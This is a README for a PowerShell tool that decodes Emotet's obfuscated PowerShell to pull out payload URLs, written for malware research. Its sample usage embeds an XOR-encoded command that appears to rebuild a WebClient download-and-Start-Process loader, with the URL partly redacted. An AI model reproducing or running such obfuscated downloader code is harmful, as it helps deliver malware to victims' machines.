# Emotet-Decode
Use to extract the Payload URL's from the Obfuscated Powershell command

********Sample below is editied to remove the Payload URL's and is an example only***********

Sample Usage: .\decode.ps1 (( 49 , 111,66 , 65 ,40,123,112, 98,56 , 122 ,119, 127,112 , 118 , 97, 53,91 , 112 ,97,59 ,66 , 112,119,86 ,121, 124, 112, 123, 97, 46, 49 , 111 , 64 , 65 , 40 , 50 ,125,97 ,97 ,101 ,47 ,58 , 58, 123,114 ,112,123 , 116 ,59 , 118 ,122,59,111 103 ,90, 60,46,70, 97 , 116 ,103 , 97,56 ,69, 103, 122,118 , 112,102, 102, 53, 49,101,103 ,90 , 46 ,119 , 103, 112 , 116, 126 ,46,104,118, 116 ,97, 118 , 125, 110, 104 ,104)|foREACh-oBJeCT { [CHAr] ($_ -BxOr'0x15') } )



This tool is provided for research purposes and only to be used for that purpose. I am not responsible for any malicious use of this tool.
